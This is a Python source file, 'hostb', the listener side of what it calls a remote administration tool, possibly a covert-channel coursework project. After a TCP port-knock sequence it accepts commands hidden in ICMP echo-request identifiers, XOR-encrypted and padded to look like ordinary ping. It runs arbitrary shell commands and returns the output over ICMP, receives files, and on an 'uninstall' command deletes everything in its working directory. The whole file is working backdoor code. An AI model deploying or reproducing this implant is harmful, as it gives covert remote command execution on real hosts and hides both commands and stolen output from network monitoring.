"""hostb: knock-then-command listener for the remote administration tool.

Usage:
    sudo python3 hostb.py -i <interface>
"""

import argparse
import hashlib
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field

from scapy.all import AsyncSniffer, ICMP, IP, TCP


KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_TIMEOUT_SECONDS = 5.0
ACK_SOURCE_PORT = 9000
ACK_DESTINATION_PORT = 54321
TTL = 64
CMD_DISCONNECT = 1
CMD_TRANSFER_FILE = 2
CMD_UNINSTALL = 3
CMD_RUN_PROGRAM = 4
ACK_READY = 0xFFFE

RECEIVED_DIRECTORY = "received"
RECEIVED_FALLBACK_NAME = "received_file"
FILE_TRANSFER_TIMEOUT_SECONDS = 10.0

# Run-program limits.
MAX_OUTPUT_BYTES = 0xFFFF
SUBPROCESS_TIMEOUT_SECONDS = 30.0
PACKET_SEND_DELAY_SECONDS = 0.002

# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
# 0x10..0x3F filler pattern. hosta ignores this payload — it only reads
# the identifier and sequence header fields.
PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))

BPF_KNOCK = (
    "tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn and ("
    + " or ".join(f"dst port {p}" for p in KNOCK_PORTS)
    + ")"
)
BPF_COMMAND = "icmp[icmptype] = icmp-echo"


@dataclass
class HostbArgs:
    iface: str | None
    key: str


@dataclass
class Context:
    args: HostbArgs | None = None
    error_message: str | None = None
    error_code: int = 1
    iface: str | None = None
    connected_to: str | None = None
    connected: bool = False
    key: int = 0
    stop_requested: threading.Event = field(default_factory=threading.Event)


@dataclass
class KnockProgress:
    knocks_received: int
    sequence_started_at: float


# ---------------------------------------------------------------------------
# Protocol helpers
# ---------------------------------------------------------------------------

def detect_source_ip(destination_ip):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((destination_ip, 1))
        return probe.getsockname()[0]
    finally:
        probe.close()


def compute_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPPROTO_TCP):
    def with_checksum(checksum):
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            protocol,
            checksum,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    return with_checksum(compute_checksum(with_checksum(0)))


def build_tcp_ack_header(source_ip, destination_ip):
    def with_checksum(checksum):
        return struct.pack(
            "!HHLLBBHHH",
            ACK_SOURCE_PORT,
            ACK_DESTINATION_PORT,
            0,                        # sequence number
            1,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x10,                     # flags: ACK only
            65535,                    # window
            checksum,
            0,                        # urgent pointer
        )
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    return with_checksum(compute_checksum(pseudo + with_checksum(0)))


def build_icmp_echo_request(identifier_encrypted, sequence):
    def with_checksum(checksum):
        header = struct.pack(
            "!BBHHH",
            8,                         # type: echo request
            0,                         # code
            checksum,
            identifier_encrypted,
            sequence,
        )
        return header + PING_PAYLOAD
    return with_checksum(compute_checksum(with_checksum(0)))


def derive_key(key_string):
    digest = hashlib.sha256(key_string.encode("utf-8")).digest()
    return (digest[0] << 8) | digest[1]


def encrypt_identifier(plaintext, key):
    return (plaintext ^ key) & 0xFFFF


def decrypt_identifier(ciphertext, key):
    return (ciphertext ^ key) & 0xFFFF


def open_raw_send_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return sock


class KnockWatcher:
    def __init__(self, on_authenticated):
        self.in_progress: dict[str, KnockProgress] = {}
        self.lock = threading.Lock()
        self.on_authenticated = on_authenticated

    def __call__(self, packet):
        if not (packet.haslayer(IP) and packet.haslayer(TCP)):
            return

        source_ip = packet[IP].src
        destination_port = int(packet[TCP].dport)
        now = time.time()
        sequence_complete = False

        with self.lock:
            progress = self.in_progress.get(source_ip)

            if progress and now - progress.sequence_started_at > KNOCK_TIMEOUT_SECONDS:
                progress = None
                self.in_progress.pop(source_ip, None)

            next_knock_index = progress.knocks_received if progress else 0
            already_accepted_ports = KNOCK_PORTS[:next_knock_index]

            # Loopback can deliver the same SYN twice; ignore the echo.
            if progress and destination_port in already_accepted_ports:
                return

            expected_port = KNOCK_PORTS[next_knock_index]
            if destination_port != expected_port:
                self.in_progress.pop(source_ip, None)
                return

            knocks_received = next_knock_index + 1
            print(f"[{knocks_received}/{len(KNOCK_PORTS)}] {source_ip} -> :{destination_port}")

            sequence_complete = knocks_received == len(KNOCK_PORTS)
            if sequence_complete:
                self.in_progress.pop(source_ip, None)
                print(f"[AUTH] {source_ip}")
            else:
                sequence_started_at = progress.sequence_started_at if progress else now
                self.in_progress[source_ip] = KnockProgress(
                    knocks_received=knocks_received,
                    sequence_started_at=sequence_started_at,
                )

        if sequence_complete:
            self.on_authenticated(source_ip)


class CommandWatcher:
    def __init__(self, expected_source, key):
        self.expected_source = expected_source
        self.key = key
        self.command_code: int | None = None
        self.command_received = threading.Event()

    def __call__(self, packet):
        if self.command_received.is_set():
            return
        if not (packet.haslayer(IP) and packet.haslayer(ICMP)):
            return
        if packet[IP].src != self.expected_source:
            return
        icmp = packet[ICMP]
        if int(icmp.type) != 8:  # echo request only
            return

        encrypted = int(icmp.id) & 0xFFFF
        sequence = int(icmp.seq) & 0xFFFF
        command_code = decrypt_identifier(encrypted, self.key)
        print(
            f"[CMD] from {self.expected_source} "
            f"id={encrypted:#06x} -> cmd={command_code} seq={sequence}"
        )
        self.command_code = command_code
        self.command_received.set()


class FileReceiveWatcher:
    def __init__(self, expected_source, key):
        self.expected_source = expected_source
        self.key = key
        self.filename_length: int | None = None
        self.file_size: int | None = None
        self.packets: dict[int, int] = {}    # seq -> decrypted 16-bit value
        self.complete = threading.Event()
        self.lock = threading.Lock()

    def __call__(self, packet):
        if self.complete.is_set():
            return
        if not (packet.haslayer(IP) and packet.haslayer(ICMP)):
            return
        if packet[IP].src != self.expected_source:
            return
        icmp = packet[ICMP]
        if int(icmp.type) != 8:
            return

        encrypted = int(icmp.id) & 0xFFFF
        sequence = int(icmp.seq) & 0xFFFF
        value = decrypt_identifier(encrypted, self.key)

        with self.lock:
            self.packets[sequence] = value

            if sequence == 1:
                self.filename_length = value
                print(f"[FILE] filename length: {value} bytes")
            elif sequence == 2:
                self.file_size = value
                print(f"[FILE] file size: {value} bytes")
            else:
                print(f"[FILE] seq={sequence} ({len(self.packets)} packets total)")

            if self.filename_length is not None and self.file_size is not None:
                num_filename_packets = (self.filename_length + 1) // 2
                num_data_packets = (self.file_size + 1) // 2
                expected_total = 2 + num_filename_packets + num_data_packets
                if len(self.packets) >= expected_total:
                    self.complete.set()


class ByteStreamWatcher:
    """Single-header byte stream: seq=1 size, seq=2..N+1 data chunks."""

    def __init__(self, expected_source, key):
        self.expected_source = expected_source
        self.key = key
        self.byte_count: int | None = None
        self.packets: dict[int, int] = {}
        self.complete = threading.Event()
        self.lock = threading.Lock()

    def __call__(self, packet):
        if self.complete.is_set():
            return
        if not (packet.haslayer(IP) and packet.haslayer(ICMP)):
            return
        if packet[IP].src != self.expected_source:
            return
        icmp = packet[ICMP]
        if int(icmp.type) != 8:
            return

        encrypted = int(icmp.id) & 0xFFFF
        sequence = int(icmp.seq) & 0xFFFF
        value = decrypt_identifier(encrypted, self.key)

        with self.lock:
            self.packets[sequence] = value
            if sequence == 1:
                self.byte_count = value
                print(f"[STREAM] byte_count={value}")
            else:
                print(f"[STREAM] seq={sequence} ({len(self.packets)} packets total)")

            if self.byte_count is not None:
                expected = 1 + (self.byte_count + 1) // 2
                if len(self.packets) >= expected:
                    self.complete.set()


def reassemble_byte_stream(packets: dict[int, int], byte_count: int) -> bytes | None:
    num_chunks = (byte_count + 1) // 2
    out = bytearray()
    for chunk_index in range(num_chunks):
        seq = 2 + chunk_index
        if seq not in packets:
            return None
        value = packets[seq]
        out.append((value >> 8) & 0xFF)
        out.append(value & 0xFF)
    return bytes(out[:byte_count])


def send_byte_stream(raw_socket, source_ip, destination_ip, key, payload: bytes):
    byte_count = len(payload)

    size_packet = build_icmp_echo_request(encrypt_identifier(byte_count, key), 1)
    size_ip = build_ip_header(
        source_ip, destination_ip, 20 + len(size_packet), socket.IPPROTO_ICMP
    )
    raw_socket.sendto(size_ip + size_packet, (destination_ip, 0))
    if PACKET_SEND_DELAY_SECONDS > 0:
        time.sleep(PACKET_SEND_DELAY_SECONDS)

    num_chunks = (byte_count + 1) // 2
    for chunk_index in range(num_chunks):
        sequence = 2 + chunk_index
        offset = chunk_index * 2
        high = payload[offset]
        low = payload[offset + 1] if offset + 1 < byte_count else 0
        value = (high << 8) | low
        icmp_packet = build_icmp_echo_request(encrypt_identifier(value, key), sequence)
        ip_packet = build_ip_header(
            source_ip, destination_ip, 20 + len(icmp_packet), socket.IPPROTO_ICMP
        )
        raw_socket.sendto(ip_packet + icmp_packet, (destination_ip, 0))
        if PACKET_SEND_DELAY_SECONDS > 0:
            time.sleep(PACKET_SEND_DELAY_SECONDS)


# ---------------------------------------------------------------------------
# FSM state functions
# ---------------------------------------------------------------------------

def handle_error(ctx: Context):
    sys.stderr.write(f"\nError: {ctx.error_message}\n")
    sys.stderr.write(f"Exit Code: {ctx.error_code}\n")
    sys.exit(ctx.error_code)


def parse_arguments(ctx: Context, argv: list[str] | None = None):
    parser = argparse.ArgumentParser(
        prog="hostb",
        description="Knock-then-command listener for the remote administration tool.",
    )
    parser.add_argument("-i", "--interface", dest="iface", required=False,
                        metavar="<interface>",
                        help="network interface to sniff on (default: scapy default)")
    parser.add_argument("-k", "--key", dest="key", required=True,
                        metavar="<key>",
                        help="pre-shared key string (must match hosta)")
    try:
        parsed = parser.parse_args(argv)
    except SystemExit as exc:
        sys.exit(1 if exc.code else 0)

    ctx.args = HostbArgs(iface=parsed.iface, key=parsed.key)


def handle_arguments(ctx: Context):
    if not ctx.args.key:
        ctx.error_message = "key must be a non-empty string"
        handle_error(ctx)
    ctx.iface = ctx.args.iface
    ctx.key = derive_key(ctx.args.key)
    signal.signal(signal.SIGINT, lambda *_: ctx.stop_requested.set())
    signal.signal(signal.SIGTERM, lambda *_: ctx.stop_requested.set())


def wait_for_session(ctx: Context):
    result: dict[str, str | None] = {"hosta_ip": None}
    done = threading.Event()

    def on_authenticated(hosta_ip):
        result["hosta_ip"] = hosta_ip
        done.set()

    watcher = KnockWatcher(on_authenticated)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_KNOCK, prn=watcher, store=False)
    sniffer.start()
    print(f"[KNOCK] listening on {ctx.iface or 'default'}; Ctrl+C to stop")

    try:
        while (
            sniffer.running
            and not done.is_set()
            and not ctx.stop_requested.is_set()
        ):
            time.sleep(0.1)
    finally:
        if sniffer.running:
            sniffer.stop(join=True)

    ctx.connected_to = result["hosta_ip"]


def establish_session(ctx: Context):
    if not ctx.connected_to:
        return

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        tcp_header = build_tcp_ack_header(source_ip, ctx.connected_to)
        ip_header = build_ip_header(source_ip, ctx.connected_to, 20 + len(tcp_header))
        try:
            raw_socket.sendto(
                ip_header + tcp_header,
                (ctx.connected_to, ACK_DESTINATION_PORT),
            )
        except OSError as exc:
            ctx.error_message = f"failed to send ack: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
    finally:
        raw_socket.close()

    print(f"[ACK] sent to {ctx.connected_to}")
    ctx.connected = True
    print(f"[CONNECTED] {ctx.connected_to}")


def listen_for_command(ctx: Context) -> int | None:
    if not ctx.connected:
        return None

    watcher = CommandWatcher(expected_source=ctx.connected_to, key=ctx.key)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
    sniffer.start()
    print(f"[CMD] waiting for commands from {ctx.connected_to}")

    try:
        while (
            sniffer.running
            and not watcher.command_received.is_set()
            and not ctx.stop_requested.is_set()
        ):
            time.sleep(0.1)
    finally:
        if sniffer.running:
            sniffer.stop(join=True)

    return watcher.command_code


def receive_file(ctx: Context):
    if not ctx.connected_to:
        return

    # Start sniffing for file packets before we send the ready-ack, so
    # we don't miss the size packet that may arrive immediately after.
    watcher = FileReceiveWatcher(expected_source=ctx.connected_to, key=ctx.key)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
    sniffer.start()

    # AsyncSniffer.start() returns before its background thread has
    # actually opened the BPF socket. Packets arriving in that window
    # are silently dropped. Wait for the sniffer to be truly ready
    # before signalling hosta to start sending.
    started_event = getattr(sniffer, "started", None)
    if isinstance(started_event, threading.Event):
        started_event.wait(timeout=2.0)
    else:
        time.sleep(0.3)

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        if sniffer.running:
            sniffer.stop(join=True)
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY, ctx.key), 1)
        ip_header = build_ip_header(
            source_ip, ctx.connected_to,
            20 + len(icmp_packet), socket.IPPROTO_ICMP,
        )
        try:
            raw_socket.sendto(ip_header + icmp_packet, (ctx.connected_to, 0))
        except OSError as exc:
            if sniffer.running:
                sniffer.stop(join=True)
            ctx.error_message = f"failed to send ready ack: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
    finally:
        raw_socket.close()

    print(f"[ACK_READY] sent to {ctx.connected_to}")

    deadline = time.time() + FILE_TRANSFER_TIMEOUT_SECONDS
    try:
        while (
            sniffer.running
            and not watcher.complete.is_set()
            and not ctx.stop_requested.is_set()
            and time.time() < deadline
        ):
            time.sleep(0.05)
    finally:
        if sniffer.running:
            sniffer.stop(join=True)

    if not watcher.complete.is_set():
        got = len(watcher.packets)
        print(f"[FILE] transfer incomplete: got {got} packets")
        return

    def collect_chunks(start_seq: int, count: int, byte_length: int, label: str) -> bytes | None:
        out = bytearray()
        for chunk_index in range(count):
            seq = start_seq + chunk_index
            if seq not in watcher.packets:
                print(f"[FILE] missing {label} packet seq={seq}; aborting write")
                return None
            value = watcher.packets[seq]
            out.append((value >> 8) & 0xFF)
            out.append(value & 0xFF)
        return bytes(out[:byte_length])

    num_filename_packets = (watcher.filename_length + 1) // 2
    num_data_packets = (watcher.file_size + 1) // 2

    filename_bytes = collect_chunks(3, num_filename_packets, watcher.filename_length, "filename")
    if filename_bytes is None:
        return
    file_bytes = collect_chunks(
        3 + num_filename_packets, num_data_packets, watcher.file_size, "data"
    )
    if file_bytes is None:
        return

    try:
        decoded_name = filename_bytes.decode("utf-8")
    except UnicodeDecodeError:
        decoded_name = ""
    safe_name = os.path.basename(decoded_name.replace("\\", "/"))
    if not safe_name or safe_name in (".", "..") or "\x00" in safe_name:
        safe_name = RECEIVED_FALLBACK_NAME
    output_path = os.path.join(RECEIVED_DIRECTORY, safe_name)

    try:
        os.makedirs(RECEIVED_DIRECTORY, exist_ok=True)
        with open(output_path, "wb") as f:
            f.write(file_bytes)
    except OSError as exc:
        ctx.error_message = f"failed to write {output_path}: {exc}"
        ctx.error_code = 2
        handle_error(ctx)

    print(f"[FILE] reproduced {output_path} ({len(file_bytes)} bytes)")


def uninstall(ctx: Context):
    cwd = os.getcwd()
    print(f"[UNINSTALL] wiping {cwd}")

    removed = 0
    failed = 0
    for entry in os.listdir(cwd):
        entry_path = os.path.join(cwd, entry)
        try:
            if os.path.islink(entry_path) or not os.path.isdir(entry_path):
                os.remove(entry_path)
            else:
                shutil.rmtree(entry_path)
            print(f"  removed {entry}")
            removed += 1
        except OSError as exc:
            print(f"  failed to remove {entry}: {exc}")
            failed += 1

    print(f"[UNINSTALL] done; removed={removed} failed={failed}; shutting down")
    ctx.connected = False
    ctx.connected_to = None
    ctx.stop_requested.set()


def run_program(ctx: Context):
    if not ctx.connected_to:
        return

    watcher = ByteStreamWatcher(expected_source=ctx.connected_to, key=ctx.key)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
    sniffer.start()

    started_event = getattr(sniffer, "started", None)
    if isinstance(started_event, threading.Event):
        started_event.wait(timeout=2.0)
    else:
        time.sleep(0.3)

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        if sniffer.running:
            sniffer.stop(join=True)
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY, ctx.key), 1)
        ip_header = build_ip_header(
            source_ip, ctx.connected_to,
            20 + len(icmp_packet), socket.IPPROTO_ICMP,
        )
        try:
            raw_socket.sendto(ip_header + icmp_packet, (ctx.connected_to, 0))
        except OSError as exc:
            if sniffer.running:
                sniffer.stop(join=True)
            ctx.error_message = f"failed to send ack_ready: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_READY] sent to {ctx.connected_to}")

        deadline = time.time() + FILE_TRANSFER_TIMEOUT_SECONDS
        try:
            while (
                sniffer.running
                and not watcher.complete.is_set()
                and not ctx.stop_requested.is_set()
                and time.time() < deadline
            ):
                time.sleep(0.05)
        finally:
            if sniffer.running:
                sniffer.stop(join=True)

        if not watcher.complete.is_set():
            print(f"[RUN] command receive incomplete: got {len(watcher.packets)} packets")
            return

        command_bytes = reassemble_byte_stream(watcher.packets, watcher.byte_count)
        if command_bytes is None:
            print("[RUN] command reassembly failed; aborting")
            return

        try:
            command_text = command_bytes.decode("utf-8")
        except UnicodeDecodeError:
            command_text = command_bytes.decode("utf-8", errors="replace")
        print(f"[RUN] executing: {command_text!r}")

        try:
            result = subprocess.run(
                command_text,
                shell=True,
                capture_output=True,
                timeout=SUBPROCESS_TIMEOUT_SECONDS,
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]".encode("utf-8")
        except subprocess.TimeoutExpired:
            output = f"[command timed out after {SUBPROCESS_TIMEOUT_SECONDS}s]".encode("utf-8")
        except Exception as exc:
            output = f"[execution error: {exc}]".encode("utf-8")

        if len(output) > MAX_OUTPUT_BYTES:
            truncation_notice = b"\n[output truncated]"
            output = output[:MAX_OUTPUT_BYTES - len(truncation_notice)] + truncation_notice
            print(f"[RUN] output truncated to {MAX_OUTPUT_BYTES} bytes")

        num_output_packets = (len(output) + 1) // 2
        print(f"[RUN] sending output back ({len(output)} bytes, {num_output_packets} packets)")

        try:
            send_byte_stream(raw_socket, source_ip, ctx.connected_to, ctx.key, output)
        except OSError as exc:
            ctx.error_message = f"failed to send output: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

        print("[RUN] output sent")
    finally:
        raw_socket.close()


if __name__ == "__main__":
    print("--------------- HOSTB ---------------")
    ctx = Context()
    parse_arguments(ctx)
    handle_arguments(ctx)

    print(f"Interface: {ctx.iface or 'default'}")

    while not ctx.stop_requested.is_set():
        print("\nWaiting for session...")
        wait_for_session(ctx)
        if ctx.connected_to is None:
            break
        print("\nEstablishing session...")
        establish_session(ctx)

        while ctx.connected and not ctx.stop_requested.is_set():
            print("\nListening for commands...")
            command_code = listen_for_command(ctx)
            if command_code is None:
                break
            if command_code == CMD_DISCONNECT:
                print(f"[DISCONNECTED] {ctx.connected_to}")
                ctx.connected = False
                ctx.connected_to = None
                break
            elif command_code == CMD_TRANSFER_FILE:
                print("\nReceiving file...")
                receive_file(ctx)
            elif command_code == CMD_UNINSTALL:
                print("\nUninstalling...")
                uninstall(ctx)
                break
            elif command_code == CMD_RUN_PROGRAM:
                print("\nRunning program...")
                run_program(ctx)
            else:
                print(f"Ignoring unknown command code {command_code}.")

    print("\nShutting down.")
